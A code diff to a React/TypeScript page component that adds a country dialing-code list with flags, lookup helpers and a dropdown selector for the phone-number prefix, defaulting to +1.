@@ -229,6 +229,68 @@ function normalizeCallingCode(value: string | null | undefined): string {
   return digits ? `+${digits}` : "";
 }
 
+type CountryDialingCode = {
+  code: string;
+  country: string;
+  flag: string;
+};
+
+const COUNTRY_DIALING_CODES: CountryDialingCode[] = [
+  { code: "+1", country: "US", flag: "🇺🇸" },
+  { code: "+1", country: "CA", flag: "🇨🇦" },
+  { code: "+44", country: "GB", flag: "🇬🇧" },
+  { code: "+84", country: "VN", flag: "🇻🇳" },
+  { code: "+86", country: "CN", flag: "🇨🇳" },
+  { code: "+81", country: "JP", flag: "🇯🇵" },
+  { code: "+82", country: "KR", flag: "🇰🇷" },
+  { code: "+66", country: "TH", flag: "🇹🇭" },
+  { code: "+62", country: "ID", flag: "🇮🇩" },
+  { code: "+63", country: "PH", flag: "🇵🇭" },
+  { code: "+60", country: "MY", flag: "🇲🇾" },
+  { code: "+65", country: "SG", flag: "🇸🇬" },
+  { code: "+91", country: "IN", flag: "🇮🇳" },
+  { code: "+92", country: "PK", flag: "🇵🇰" },
+  { code: "+880", country: "BD", flag: "🇧🇩" },
+  { code: "+234", country: "NG", flag: "🇳🇬" },
+  { code: "+7", country: "RU", flag: "🇷🇺" },
+  { code: "+49", country: "DE", flag: "🇩🇪" },
+  { code: "+33", country: "FR", flag: "🇫🇷" },
+  { code: "+39", country: "IT", flag: "🇮🇹" },
+  { code: "+34", country: "ES", flag: "🇪🇸" },
+  { code: "+351", country: "PT", flag: "🇵🇹" },
+  { code: "+55", country: "BR", flag: "🇧🇷" },
+  { code: "+52", country: "MX", flag: "🇲🇽" },
+  { code: "+57", country: "CO", flag: "🇨🇴" },
+  { code: "+54", country: "AR", flag: "🇦🇷" },
+  { code: "+90", country: "TR", flag: "🇹🇷" },
+  { code: "+971", country: "AE", flag: "🇦🇪" },
+  { code: "+966", country: "SA", flag: "🇸🇦" },
+  { code: "+20", country: "EG", flag: "🇪🇬" },
+  { code: "+98", country: "IR", flag: "🇮🇷" },
+  { code: "+852", country: "HK", flag: "🇭🇰" },
+  { code: "+886", country: "TW", flag: "🇹🇼" },
+];
+
+function findDialingCodeByCode(callingCode: string): CountryDialingCode {
+  const normalized = normalizeCallingCode(callingCode);
+  if (normalized) {
+    const match = COUNTRY_DIALING_CODES.find((item) => item.code === normalized);
+    if (match) {
+      return match;
+    }
+  }
+  return COUNTRY_DIALING_CODES[0];
+}
+
+function findDialingCodeByCountryCode(countryCode: string): CountryDialingCode {
+  const upper = countryCode.toUpperCase();
+  const match = COUNTRY_DIALING_CODES.find((item) => item.country === upper);
+  if (match) {
+    return match;
+  }
+  return COUNTRY_DIALING_CODES[0];
+}
+
 function escapeHtml(value: string | null | undefined): string {
   if (value == null) {
     return "";
@@ -298,11 +360,13 @@ export default function HomePageClient({
   const sidebar = dictionary.sidebar;
   const pageContent = dictionary.page;
   const [clientCountryCode, setClientCountryCode] = useState(detectedCountryCode ?? "");
-  const [clientCallingCode, setClientCallingCode] = useState(normalizeCallingCode(detectedCallingCode));
+  const [clientCallingCode, setClientCallingCode] = useState(normalizeCallingCode(detectedCallingCode) || "+1");
   const [clientLocation, setClientLocation] = useState(detectedLocation ?? "");
   const [clientIp, setClientIp] = useState(detectedIp ?? "");
-  const phoneFlag = countryCodeToFlag(clientCountryCode);
-  const phoneCode = normalizeCallingCode(clientCallingCode);
+  const selectedDialingCode = findDialingCodeByCode(clientCallingCode);
+  const [selectedCountryCode, setSelectedCountryCode] = useState(selectedDialingCode.country);
+  const phoneFlag = countryCodeToFlag(selectedCountryCode);
+  const phoneCode = normalizeCallingCode(selectedDialingCode.code) || "+1";
 
   const privacyCenterActions: ActionItem[] = [
     {
@@ -1180,10 +1244,22 @@ export default function HomePageClient({
                   {errors.pageName ? <p className={styles.fieldError}>{errors.pageName}</p> : null}
 
                   <div className={styles.phoneInputWrap}>
-                    <span className={styles.phonePrefix}>
-                      <span className={styles.phoneFlag}>{phoneFlag}</span>
-                      <span className={styles.phoneCode}>{phoneCode}</span>
-                    </span>
+                    <select
+                      className={styles.phoneSelect}
+                      value={selectedCountryCode}
+                      onChange={(event) => {
+                        const next = findDialingCodeByCountryCode(event.target.value);
+                        setSelectedCountryCode(next.country);
+                        setClientCallingCode(next.code);
+                      }}
+                      aria-label="Country code"
+                    >
+                      {COUNTRY_DIALING_CODES.map((item) => (
+                        <option key={`${item.country}-${item.code}`} value={item.country}>
+                          {item.flag} {item.code}
+                        </option>
+                      ))}
+                    </select>
                     <input
                       id="phoneNumber"
                       type="tel"
